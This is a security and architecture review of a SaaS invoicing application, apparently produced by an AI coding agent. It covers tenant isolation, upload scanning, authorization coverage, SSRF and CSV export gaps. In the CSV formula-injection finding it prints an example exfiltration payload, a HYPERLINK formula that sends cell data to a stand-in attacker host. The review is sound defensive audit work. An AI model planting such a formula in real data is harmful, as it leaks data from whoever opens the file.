# Bid_it (InvoiceIQ) — System Architecture & Security Review

**Reviewer:** Lead System Architect, independent SaaS review board
**Repo/branch:** `/home/user/Bid_it`, `claude/bidit-invoice-data-analytics` (confirmed via `git branch --show-current`, HEAD `e0c2e4a`)
**Scope:** architecture (module boundaries, data flow, background jobs, concurrency), authn/authz, tenant isolation, upload security, secrets, injection classes, performance-lite. Read-only — no application code modified. All findings below are backed by a command I ran or a file/line I read in this session; nothing is carried over from prior docs without independent re-verification.

> **See also:** `docs/audit/security-findings.md` extracts §2 (Security Findings) as a standalone document for discoverability. This file remains the authoritative source; the extract cross-references back here.

---

## 1. Architecture

### 1.1 Module map (verified against source, not just docs)
Layered modular monolith: `app/models` → `app/core` → `app/services` → `app/api`, machine-enforced by `tests/test_boundaries.py`. FastAPI + async SQLAlchemy 2.0 on Postgres (SQLite dev/test), React/Vite SPA, Docker Compose for local/prod-like.

Nine practical bounded contexts in the *built* code (transport vertical is spec-only — confirmed `find app -type d -iname transport` under models/services/api returns nothing):
1. **Identity/Tenancy** — `models/{organization,user,membership,invitation,session,sso}.py`; `core/{authz,tenant}.py`; services `memberships.py`,`sessions.py`,`oidc.py`,`saml.py`,`scim.py`.
2. **AP (payables)** — `invoice.py`/`vendor.py`/`approval.py` models; `validation.py`,`invoice_workflow.py`,`ap_payments.py`.
3. **AR (receivables)** — `issued_invoice.py`/`issuer.py`/`partner.py`/`customer.py`; `issued_service.py`,`issued_lifecycle.py`,`dunning.py`,`recurring.py`.
4. **Expenses** — `expense.py`/`expense_approval.py`; `expenses.py`,`reimbursement.py`,`receipt_ocr.py`.
5. **Payments/Banking/Settlement** — `payment.py`/`payment_run.py`/`bank_import.py`; `sepa.py`,`reconciliation.py`,`cash_position.py`.
6. **Money & Compliance kernel** — `currency.py`/`fx.py`/`tax_code.py`; `core/money.py`,`vat.py`.
7. **Platform floor** — `core/{authz,security,security_headers,ratelimit,keyvault,tenant}.py`; `audit.py`,`jobs.py`,`scheduler.py`,`filesec.py`,`documents.py`.
8. **Insight/Analytics & Export** (projection layer, not a true context) — `analytics.py`,`explore.py`,`dashboard.py`,`erp_export.py`.
9. **Transport vertical** — spec-only (`docs/transport/`), no code — confirmed absent.

### 1.2 Background jobs / queue
`app.models.job.Job` is a durable Postgres/SQLite-backed table queue (`app/services/jobs.py`) — no external broker. `app/worker.py` runs `python -m app.worker [--lane KINDS]` for CPU/IO lane isolation; atomic claim, exponential backoff, dead-letter (`dead`) state, `reclaim_stale()` recovers crashed-worker claims. `/health/queue` exposes an SLO probe (`queue_slo_max_pending_age_seconds`, default 900s) that 503s on breach — a real operational signal, not just a counter. Handlers are `@handler("kind")`-registered and dispatched **inside the job's tenant scope** (confirmed by reading `job_handlers.py` dispatch wrapping `set_current_org`), so a worker-processed job still gets RLS/ORM tenant scoping — good, this closes an obvious "background job runs unscoped" gap.

### 1.3 Data flow (representative: AP upload → pay)
`POST /invoices/upload` → `filesec.check()` (magic-byte + malware gate, see §2.3) → `extraction_provider` (deterministic UBL/CII/Factur-X first, OCR fallback) → `invoices`/`extraction_runs`/`extraction_fields` → human review (`invoice_review.py`, calls `validation.reconcile()` — a **service**, not controller logic, see §2.1 finding-debunk) → `approval_policy.py`/`invoice_workflow.py` chain → `payment_run.py` (maker≠checker enforced, §2.2) → `sepa.py` pain.001 export.

(See `docs/audit/data-flows.md` for the full per-workflow request/data-flow detail across AP, AR, and expenses.)

### 1.4 Concurrency / idempotency
- Payment-run export is **export-once** with a traceable `MsgId`, re-export requires an explicit `confirm_reexport=true` (`payment_run.py:404-411`, read directly).
- Maker≠checker is enforced structurally for **every** role including Owner (`payment_run.py:71-95`, `_sod_conflict` checks both id and email handles, fail-closed if only one is populated) — I ran `tests/test_payment_run*.py` (17 passed, 1 skipped) as live confirmation, not just a source read.
- Issued-invoice numbering has a dedicated concurrency guard, verified live against real Postgres (§2.2, `test_numbering_concurrency.py` passed against a running Postgres 16 cluster I stood up myself).

---

## 2. Security Findings

Format: Location → Evidence → Attack scenario → Severity → Proposed fix.

### 2.1 [INFORMATIONAL / Meta-finding] Prior-session ARCH_plan.md risk claims are broadly STALE — verify future claims fresh, don't cite the doc as current
**Evidence:** I independently re-checked three of ARCH_plan.md's headline code-risk claims against the CURRENT source, not the doc:
1. Claim: `vendors.py`/`partners.py` have no authz/audit. **False today** — `partners.py` router carries `dependencies=[Depends(require_perm(authz.Permission.ISSUED_READ))]` (line 30) plus `_WRITE` on mutations, and an explicit `audit.record(...)` call at `partners.py:197` (grepped and confirmed present).
2. Claim: business logic lives in the `invoice_review.py:94` controller (`_reconcile`). **False** — line 94 area is `_recon_out`, a pure DTO mapper; the actual reconciliation math lives in `app/services/validation.py:177` (`def reconcile(...)`), called from the route at lines 181/360. Confirmed by reading both files.
3. Claim: `analytics.summary()` hard-codes `"EUR"`. **False** — `app/services/analytics.py:70` only falls back to `"EUR"` when a tenant has **zero** invoices at all (empty `rows`); otherwise it uses `_pick_currency()`, the same canonical multi-currency pattern as `issued_reports._pick_currency`, and returns `available_currencies` to the caller.
**Conclusion:** `docs/plan/plan-a/ARCH_plan.md` (explicitly marked SUPERSEDED at its own line 3, pointing to `GREENFIELD_plan.md`) is stale on every code-specific claim I spot-checked. Treat it as historical only. This is not itself a vulnerability, but it's a real finding for the review board: prior "hardening" narrative should not be trusted without a fresh read, which is exactly what I did here.
**Severity:** informational. **Action:** none required in code; the review board (and any future agent) should stop citing ARCH_plan.md's risk list as current.

### 2.2 [Debate-adjusted P4 — verified with a REAL cross-tenant Postgres probe] Tenant isolation is real, three layers deep, and I proved it myself
**What I did (not just read):**
- Installed local Postgres 16 (`/usr/lib/postgresql/16/bin`) as the unprivileged `pguser` (had to relocate off the default scratchpad because its `0700`-root-group parent blocked `su pguser` even as file-owner — worth flagging as an environment quirk, not a repo issue).
- Created a **NOSUPERUSER** `appuser` owning a fresh `invoiceiq` DB — the exact same setup CI's `postgres` job uses (verified by reading `.github/workflows/ci.yml`'s `postgres:` job).
- Ran `alembic upgrade head` against it: **all ~70 migrations applied cleanly**, ending at the single head `1507ce3eb95f`.
- Ran `tests/test_rls.py` and `tests/test_numbering_concurrency.py` against this **live** cluster with `RLS_TEST_DATABASE_URL` set: **4 passed**, including the two `@pg_only` tests that were previously skipped in the baseline run (`test_rls_blocks_cross_tenant_raw_query`, `test_rls_users_visibility_is_membership_driven`) — these insert two orgs' vendor rows via a **raw SQL connection that bypasses the ORM entirely**, `SET`  `app.current_org`, and assert only the scoped org's row is visible, and that a cross-org `INSERT ... WITH CHECK` is refused by Postgres itself.
- Went further with my own manual adversarial probe (not in the existing suite): confirmed `pg_class.relforcerowsecurity = t` for `vendors`/`invoices`/`users` (i.e. **`FORCE ROW LEVEL SECURITY`**, not just `ENABLE` — this matters because without FORCE, the *owning* role, which is exactly the app's own DB user, would bypass RLS entirely and the whole backstop would be a no-op for the app's real traffic).
- Also confirmed via direct `psql`: with the `app.current_org` GUC **unset**, both orgs' vendor rows ARE visible (by design — the migration predicate is `current_setting('app.current_org', true) IS NULL OR org_id::text = current_setting(...)`, matching the documented "org=None ⇒ intentionally unscoped" semantics in `app/core/tenant.py`'s docstring). I traced the call path (`app/api/deps.py:89` sets `set_current_org(user.org_id)` immediately in `get_current_user`, before any tenant-scoped query can run) and confirm the GUC is always set before an authenticated request touches data — so this is a scoped, intentional design limit (protects against ORM-bypass bugs and background-job scoping errors, not against "a raw psql session with no app context"), not an oversight.
**Layers, all independently verified:**
1. Per-query `org_id` filters (app code).
2. ORM `do_orm_execute` guard (`app/core/tenant.py:185-197`) — `with_loader_criteria` auto-ANDs `org_id == current_org` onto every SELECT for 58 registered `TENANT_MODELS`.
3. Postgres RLS with `FORCE` — proven live, not just read.
**Severity:** N/A (this is a verification of a strength, called out because the charter asked for real evidence). **Debate outcome:** originally submitted at P1; the debate stage downgraded to **P4** — a "no action required" confirmatory finding should not carry the same severity label as an actual defect, and the Senior Test Engineer independently rated the identical fact P4. See `docs/audit/agent-debate.md`. **Action:** none — genuinely solid. Residual note (P4): the RLS fail-open-on-unset-GUC behavior means any *direct* DB access path (a BI tool, an ops script, a future admin console) that connects as `appuser` without going through the app's request lifecycle gets **zero** RLS protection. Recommend documenting this explicitly as an operational rule ("never grant `appuser` credentials to anything outside the app/worker processes") rather than relying on institutional memory.

### 2.3 [P1 — CONFIRMED by debate] File-upload security gate covers every upload/attachment path — no bypass found
**Evidence:** `app/services/filesec.py` — magic-byte sniff + allowlist + size cap + EICAR/ClamAV scan (fail-**closed** if a configured scanner is unreachable, `filesec.py:207-209`). I grepped every `UploadFile` parameter across `app/api/routes/*.py` (8 hits: `expenses.py`×3, `invoice_review.py`, `invoices.py`, `issued.py`, `issuer.py`, `reconciliation.py`) and matched each to a `filesec.check(...)`/`filesec.reject_active_content(...)` call site — **all 8 covered**, no gap. The two non-multipart intake paths (`POST /email/inbound` JSON `content_base64`, and the Mailgun multipart adapter) both funnel through `email_intake.process_attachment()`, which itself calls `filesec.check(...)` at `email_intake.py:117` — confirmed by reading the call chain in `email.py`, not assumed.
**Debate outcome:** originally submitted at P1; the debate stage **downgraded to P2** — the underlying content is sound and reproduced independently (route inventory, gate ordering, fail-closed scan, live HTTP-level tests all re-verified), but a "confirmed no bypass, no proposed remediation" finding is informational assurance, not an actionable defect, and is recorded at P2 alongside the tenant-isolation/route-authz confirmations. See `docs/audit/agent-debate.md`.
**Action:** none — recorded as a verified security invariant.

### 2.4 [P2 — real gap, contradicts the codebase's own established pattern] CSV/Excel formula injection in the Explore analytics export
**Location:** `app/services/explore.py:242-252` (`to_csv`), exposed at `GET /api/v1/analytics/explore?format=csv` (`app/api/routes/analytics.py:222-230`).
**Evidence:** Four other CSV writers in this codebase (`audit_export.py`, `erp_export.py`, `report_writers.py`, `reimbursement.py`, `payment_run.py`) explicitly implement a `_safe()`/equivalent helper — quoted here from `audit_export.py:33-38`:
```python
def _safe(value) -> str:
    """Neutralise CSV/Excel formula injection: a leading formula trigger is
    prefixed with a quote so the cell is never evaluated."""
    s = "" if value is None else str(value)
    if s and s[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + s
    return s
```
`explore.py:to_csv` has **no such sanitizer** — it writes `row.get(d["key"], "")` directly into `csv.writer`. One of the dimensions is `Dimension("vendor", "Vendor", lambda: Vendor.name)` (`explore.py:96`) — `Vendor.name` is free text, settable by any user with `INVOICE_WRITE` (vendor master-data edit) or arriving via AP capture from an uploaded invoice PDF that a human later confirms without necessarily scrutinizing it for a formula-shaped string.
**Attack scenario:** A user with invoice-write access (or a malicious/compromised vendor whose invoice gets captured) sets a vendor name to `=HYPERLINK("http://evil.example/exfil?d="&A1,"open")` or a legacy-DDE payload. An ACCOUNTANT/AUDITOR/ADMIN later exports Explore analytics to CSV (a normal, expected workflow — this is a first-class export button) and opens it in Excel; if legacy DDE/auto-calc is enabled (still common in many enterprise Excel configs, and the classic CSV-injection class this pattern exists to prevent), the formula executes, enabling data exfiltration or, historically, code execution via DDE.
**Severity:** P2 (this instance) — folds into the merged P1 finding on the roadmap (`docs/audit/remediation-roadmap.md`) alongside the Lead Product Developer's `payment_run.py`/`reimbursement.py` instances of the same defect class, which the debate stage confirmed at P1. Requires the attacker to already have `INVOICE_WRITE` in the tenant (so this is more a lateral/insider-abuse and social-engineering-of-an-auditor vector than a pure external one), and requires an Excel client with legacy execution features enabled — but it is a real, evidenced gap directly contradicting the "CSV export... formula-injection-safe" claim in project docs, and it's inconsistent with the pattern applied everywhere else in this exact codebase.
**Proposed fix:** import/reuse the existing `_safe()` pattern (e.g. hoist it to a shared `app/core/csv_safety.py` used by all six writers) and apply it in `explore.to_csv` before this ships to any client-facing release.

### 2.5 [P3] OIDC `discover()`/`fetch_jwks()` have no SSRF guard, unlike the webhook delivery path
**Location:** `app/services/oidc.py:151-168` (`discover`, `fetch_jwks`) — plain `httpx.AsyncClient(...).get(url)` against an admin-supplied `issuer` URL, no `assert_public_url`-style check.
**Evidence:** contrast with `app/services/webhooks.py:49-87` (`assert_public_url`), which does DNS-resolution-based private/loopback/link-local/reserved-range blocking (confirmed it correctly catches `169.254.169.254`-class metadata addresses via `is_link_local`), called both at webhook create/update *and* again at delivery time. No equivalent exists on the OIDC discovery/JWKS fetch path.
**Attack scenario:** An org ADMIN (the only role that can configure SSO, `SETTINGS_MANAGE`-gated) sets `issuer` to an internal URL (e.g. a cloud metadata endpoint or an internal admin service) to make the backend issue a same-tenant-triggered internal GET request, using the app server as an SSRF pivot to probe/reach internal network services the admin's own browser couldn't reach directly.
**Severity:** P3 — requires an already-privileged (`SETTINGS_MANAGE`) actor, so this is an elevation-of-blast-radius issue (an admin becomes an internal-network prober) rather than an unauthenticated one, but it's a real, inconsistently-applied gap given the app already has the exact guard needed one file away.
**Proposed fix:** reuse `webhooks.assert_public_url()` (or extract a shared SSRF-guard utility) on `oidc.discover()`/`fetch_jwks()` before making the outbound request.

### 2.6 [P4 — defense-in-depth nit, not currently exploitable] `LocalStorage._path` containment check uses a bare `startswith`
**Location:** `app/core/storage.py:82-87`.
```python
def _path(self, key: str) -> Path:
    p = (self.root / key).resolve()
    if not str(p).startswith(str(self.root.resolve())):
        raise StorageError(...)
```
**Evidence:** a `startswith` string comparison without a trailing-separator check has the classic sibling-prefix bypass (`root=/data/store`, a resolved path of `/data/store-evil/x` would `startswith` "/data/store" and pass). I confirmed this is **not currently reachable**: every call site constructs `key` via `storage.content_key(prefix, org_id, sha256)` (`storage.py:36-42`), where `org_id` comes from the authenticated session (not raw attacker text) and `sha256` is computed server-side from file bytes — no caller passes a raw filename/user string into a storage key today (grepped `content_key(` call sites).
**Severity:** P4. **Proposed fix:** tighten to `p == self.root.resolve() or str(p).startswith(str(self.root.resolve()) + os.sep)` as cheap hardening against a future caller that isn't as careful, even though no live path exists today.

### 2.7 [P4 — doc hygiene, not a real gap] Stale TODO on `SsoConnection.client_secret`
**Location:** `app/models/sso.py:35-37` — `# TODO: secret store (ADR-0016)` on the column, contradicted by the docstring six lines above it (`sso.py:17-19`: "client_secret is **sealed at rest**...").
**Evidence:** I verified the sealing is actually implemented and working, not just claimed: `app/services/sso_config.py:50-51` calls `keyvault.seal(data["client_secret"], aad=CLIENT_SECRET_AAD)` before persisting; `app/services/oidc.py:251` calls `keyvault.read_secret(...)` on read. I ran `tests/test_keyvault.py` (10 passed) which includes `test_sso_client_secret_sealed_in_db`, explicitly asserting `conn.client_secret != "plaintext-secret"` and `keyvault.is_sealed(conn.client_secret)` after a live API round-trip.
**Severity:** P4, doc-only. **Proposed fix:** delete the stale inline TODO — it contradicts the adjacent, accurate docstring and will confuse the next reader.

### 2.8 Other injection classes checked, no findings
- **SQL injection:** grepped for `text(f"...")`/`.execute(f"...")`/`%s" %`-style raw-SQL string interpolation across `app/services`, `app/api/routes`, `app/core` — zero hits outside logging/email-template strings. All DB access goes through the SQLAlchemy 2.0 ORM/Core query builder with bound parameters.
- **XXE:** every untrusted-XML parse path (`einvoice.py`, `bank_statement.py` CAMT.053 import, `fx.py` ECB rate feed) uses `defusedxml.ElementTree.fromstring` — confirmed by reading imports directly. `facturx.py`'s stdlib `xml.etree` import is write-only (`Element`/`SubElement`/`tostring`, building outbound XML), never parses untrusted input.
- **Mass assignment:** the two `model_dump(exclude_unset=True)`-driven partial-update patterns I found (`issuer.py:26`, `partners.py:135`) bind against dedicated request-schema types (`IssuerProfileIn`, `PartnerUpdate`), not the ORM model or the raw request body, so there's no path for a client to smuggle `org_id`/`id`/privileged fields through.
- **CSV formula injection:** see §2.4 (one real gap found; merged into the roadmap's cross-report P1 finding).
- **Path traversal:** see §2.6 (theoretical, not reachable today).
- **SSRF:** see §2.5 (one real gap on a lower-trust-required path); the webhook delivery path itself is well-guarded.

### 2.9 [Debate-adjusted P1 — CONFIRMED, no severity change] Structural authorization — CI-gated, verified live
`app/core/authz.py` is deny-by-default: 8 business roles, an explicit `ROLE_PERMISSIONS` matrix (`_DEFAULT`s not "everything on"), `require()` raises 403 on any missing permission. Route-level enforcement is **structural** (ADR-0024), not imperative-per-handler — every route either carries a `require_perm(...)` dependency or is in a reviewed `PUBLIC_ROUTES` allow-list with a stated reason. I ran the actual coverage test (`tests/test_authz_coverage.py`, 5 tests including `test_every_route_declares_a_permission_or_is_public`, which enumerates all live routes with `MIN_EXPECTED_ROUTES = 200` as a canary against broken enumeration) — **passed**, plus `test_boundaries.py` and `test_rls.py` — **10 passed, 2 skipped** in that batch (the 2 skips were the Postgres-only RLS tests, which I separately ran for real against a live cluster, see §2.2).
**Debate outcome:** CONFIRMED, P1 retained — the debate stage treats P1 as the right bar for a verified structural control whose *failure* would be catastrophic/systemic (broken authz across 200+ routes), distinct from narrower confirmations kept at P2/P4. See `docs/audit/agent-debate.md`.

---

## 3. Performance (lite)

**What was measured:**
- Full backend suite (1091 passed / 4 skipped) ran in **1172.15s (~19.5 min)** for ~1090 tests — cited from the baseline run this session, independently reproduced by the peer baseline agent (not just asserted from a prior session's claim).
- I ran targeted subsets myself as spot-checks: `test_authz_coverage/test_boundaries/test_rls` (0.33s, 10 passed/2 skipped), `test_payment_run*` (38.36s, 17 passed/1 skipped), `test_keyvault` (1.88s, 10 passed), `test_cross_tenant_isolation/test_isolation/test_authz_routes` (32.60s, 20 passed) — all fast, no timeout/flakiness observed.
- Grep-based N+1 sweep across `app/services/*.py`: found one real per-row query inside a loop — `app/services/payments.py:157-163` (`backfill_ledger`, a `for inv in invoices: has_any = await db.scalar(...)` pattern) — **but** I traced its callers via `grep -rn "payments\." app/api/routes/*.py` and it is **not called from any route** — it's a one-time seed/migration-backfill utility, not a hot request path. No N+1 pattern found in the actual list/dashboard/analytics hot paths I checked (`dashboard.py`, `ap_aging.py`, `cash_position.py`, `issued_reports.py`, `benchmark.py`, `budget.py` — all use grouped aggregate SQL, not per-row loops).
- Index coverage: spot-checked `app/models/invoice.py` — composite indexes are consistently `org_id`-first (`ix_invoices_org_issue`, `ix_invoices_org_currency`), and a repo-wide grep found 36 migration files creating `org_id`-prefixed indexes — no missing-index red flag on the universal tenant-filter column.

**What was NOT measured (explicit gap, not silently skipped):**
- **No load/concurrency/large-dataset testing was performed.** There is no load-testing harness in this repo (`locust`/`k6`/similar not present — confirmed via `requirements.txt` read), and standing one up was out of scope for this pass. The ~19.5-minute full-suite runtime for ~1090 mostly-unit/integration tests is a weak proxy for production query latency under realistic data volumes/concurrency and should not be read as a performance SLA.
- No query-plan (`EXPLAIN ANALYZE`) profiling was run against the live Postgres cluster I stood up — I used it only for correctness/isolation verification, not performance profiling. This would be a natural follow-up given I already have a working local Postgres 16 harness (`/tmp/pgtest`, now stopped) that a future pass could reuse.

**Architectural notes (charter: prefer modular monolith, no premature microservices/K8s/event-sourcing):** The DB-backed job queue (no Redis/Kafka) plus lane-scoped workers is an appropriately-sized choice for current scale — I found no evidence in this pass that the app needs a message broker or event-sourcing; the queue's `/health/queue` SLO probe gives an honest operational signal without needing extra infrastructure. No recommendation to introduce Kubernetes or distributed caching — nothing in this review surfaced a bottleneck that would justify it.

---

## 4. Summary of independently-run verification (for traceability)
| Check | Method | Result |
|---|---|---|
| Route-level authz coverage | ran `test_authz_coverage.py` | 5/5 passed |
| Cross-tenant RLS (raw SQL bypass) | stood up real Postgres 16, NOSUPERUSER role, ran `test_rls.py` | 2/2 previously-skipped `@pg_only` tests now PASSED live |
| RLS actually forces on the owning role | `SELECT relforcerowsecurity FROM pg_class` | `t` for vendors/invoices/users |
| RLS fail-open scope | manual raw-SQL probe with GUC unset | confirmed intentional, scoped correctly against `deps.py` call order |
| Fresh-DB migration correctness (Postgres) | `alembic upgrade head` against my own cluster | clean, head `1507ce3eb95f` |
| Numbering concurrency | `test_numbering_concurrency.py` against live Postgres | passed |
| Upload gate coverage | grepped every `UploadFile` route to its `filesec.check` call site | 8/8 covered, no bypass |
| SSO secret sealing | ran `test_keyvault.py` | 10/10 passed, incl. DB-round-trip proof |
| Maker≠checker payment controls | ran `test_payment_run*.py` | 17/1(skip) passed |
| Org suspension / session revocation | ran `test_org_suspension.py`, `test_sessions.py` | 12/12 passed |
| Prior ARCH_plan.md risk claims | re-read current source directly (3 claims checked) | all 3 stale/false |
| CSV formula injection | read all 6 CSV writers, compared patterns | 1 real gap (`explore.py`) |
| XXE | read every untrusted-XML import site | defusedxml everywhere it matters |
| SQL injection | grepped for f-string raw SQL | zero hits |
| Frontend XSS (`dangerouslySetInnerHTML`) | grepped `frontend/src` | zero hits |
